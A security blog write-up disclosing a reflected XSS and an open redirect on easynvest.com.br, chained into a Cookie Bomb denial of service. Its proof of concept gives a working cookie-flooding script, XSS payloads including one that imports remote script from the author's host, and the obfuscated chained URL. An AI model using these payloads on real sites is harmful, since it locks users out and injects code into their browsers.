---
layout: content
title: 'Chaining client-side vulnerabilities to make a web app unavailable'
description: 'Two client-side vulnerabilities that, if exploited by an attacker, could expose the legitimate users of the application to various risks, one of which is a kind of "unavailability"'
og_image: https://heitorgouvea.me/images/publications/nuinvest/xss-triaged.png
---

Table of contents:
- [Summary](#summary)
- [Description](#description)
- [Prooft of Concept](#proof-of-concept)
- [Impact](#impact)
- [Conclusion](#conclusion)
- [References](#references)

---

### Summary

During a security analysis of the web application operated by easynvest.com.br (acquired by Nubank), two client-side vulnerabilities were identified. When combined, these flaws can be exploited to compromise the availability of the service for legitimate users. Specifically, the attack chain enables a Denial of Service (DoS) condition through client-side exploitation.

Timeline

```
23/05/2020: PoC performed;
24/05/2020: Reported Vulnerability;
27/05/2020: Confirmed Vulnerability;
13/07/2020: Vulnerability "fix";
21/12/2022: Publication of this article.
```

*Disclaimer:* the responsible company was informed about all details contained in this publication in the shortest possible time and it positioned itself in an ethical and transparent manner, demonstrating due attention and commitment. During all tests, no system was invaded or breached, in addition, the company performed some of the necessary actions/modifications to minimize any undue action that explores the context covered in this publication.

---

### Description

The application includes a feature that generates personalized referral links using URL parameters, as shown in the following example:

![Imagem](/images/publications/nuinvest/link-indique.png)

[https://indique.easynvest.com.br?nome=heitor%20REDACTED&id=[NUMERICAL ID REDACTED]]()

![Imagem](/images/publications/nuinvest/site.png)

Upon accessing the link, the “?nome=” parameter is directly reflected on the user's screen. This behavior indicates the presence of a reflected Cross-Site Scripting (XSS) vulnerability ([1], [2]). The vulnerability was confirmed with the following payload:

[https://indique.easynvest.com.br/?nome=<audio src/onerror=alert(1)>&id=1]()

![Imagem](/images/publications/nuinvest/xss-triaged.png)

Although the vulnerability is exploitable, its impact is limited by several factors:

* The vulnerable component is hosted on a subdomain, restricting access to LocalStorage on the main domain;
* Sensitive cookies are protected with the HTTPOnly flag;
* Being a reflected XSS, it is not easily propagated without user interaction;
* The main domain enforces strong security policies, including anti-CSRF tokens, and headers such as X-Frame-Options (XFO), Content Security Policy (CSP), and CORS.

Given these constraints, the investigation focused on identifying a complementary vulnerability that could be chained with the reflected XSS. Analysis of the authentication page's JavaScript revealed an Open Redirect vulnerability ([3], [4]):

[https://www.easynvest.com.br/autenticacao?redirect_url=https://google.com]()

Demo:

<iframe width="100%" height="523" src="https://www.youtube.com/embed/sN1J3py9aUo" title="Open Redirect - Easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

This unvalidated redirect on the main domain allows malicious payloads to be delivered more reliably, partially bypassing the limitations of the subdomain-restricted XSS. However, further exploitation aimed at Account Takeover, data exfiltration, or critical actions was unsuccessful due to the application’s enforcement of Multi-Factor Authentication (MFA) for sensitive operations ([7]).

As an alternative, the combination of the vulnerabilities was leveraged to perform a Cookie Bomb attack, with the goal of rendering the application unavailable for users who visit a crafted malicious link. The attack involves injecting an excessive number of oversized cookies, surpassing server processing thresholds. As a result, subsequent requests from the affected browser are rejected, causing the application to fail to load—effectively creating a client-specific Denial of Service condition. Modern browsers typically allow multiple cookies, each up to ~4KB in size. However, most servers are not designed to handle unusually large volumes of cookie data, leading to application inaccessibility until the user manually clears the cookies or they expire.

For in-depth understanding, refer to: "Cookie Bomb or Let's Break the Internet" [9] by Egor Homakov "Denial of Service with Cookie Bomb" [10] by filedescriptor.

---

### Proof of Concept

The exploitation chain proceeds as follows:

1. Host a JavaScript payload to generate oversized cookies:
    

```javascript
var base_domain = document.domain.substr(document.domain.indexOf('.'));
var pollution   = Array(4000).join('a');

for (var i = 1; i < 99; i++) {
    document.cookie='bomb' + i + '=' + pollution + ';Domain=' + base_domain + ";path=/";
}

window.location="https://" + document.domain;
```
    
    * Hosted on: [https://heitorgouvea.me/public/payloads/bomb.js](https://heitorgouvea.me/public/payloads/bomb.js)

2. Trigger the script via reflected XSS: 
    
    [https://indique.easynvest.com.br/?nome=><audio src="" onerror=import('//heitorgouvea.me/public/payloads/bomb.js');>&id=1]()

3. Use an Open Redirect (with a shortened URL) to obfuscate the malicious payload: [https://cutt.ly/syPnJXp]()

Final chained payload: [https://easynvest.com.br/autenticacao?redirect_url=https://cutt.ly/syPnJXp]()

And this was the result:

<iframe width="100%" height="523" src="https://www.youtube.com/embed/-L2pl1Ke_Lo" title="Cookie Bomb - easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

---

### Impact

This attack chain enables an adversary to induce localized unavailability of the application for specific users. By exceeding the server's cookie processing capacity, the application becomes unresponsive for the affected user until they clear the injected cookies. While this analysis focused solely on a DoS vector, additional attack scenarios could emerge depending on future application changes or misconfigurations.

---

### Conclusion

The exploitation described requires relatively low technical effort but can have a notable impact on user experience. By chaining a reflected XSS with an Open Redirect, it is possible to execute a Cookie Bomb attack resulting in targeted denial of service. Although this vector is not commonly exploited in real-world attacks, it is effective under the right conditions.
Following responsible disclosure, the company took the following actions:

* No definitive remediation was applied to the Open Redirect vulnerability;
* The XSS vulnerability was partially mitigated via Web Application Firewall (WAF) rules, although multiple bypasses were identified. Technical feedback was provided, but no further updates were received.

---

### References

- [1] [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)
- [2] [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)
- [3] [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [4] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [5] [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [6] [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [7] [https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)
- [8] [https://en.wikipedia.org/wiki/HTTP_cookie](https://en.wikipedia.org/wiki/HTTP_cookie)
- [9] [https://blog.innerht.ml/tag/cookie-bomb/](https://blog.innerht.ml/tag/cookie-bomb/)
- [10] [https://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html](https://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html)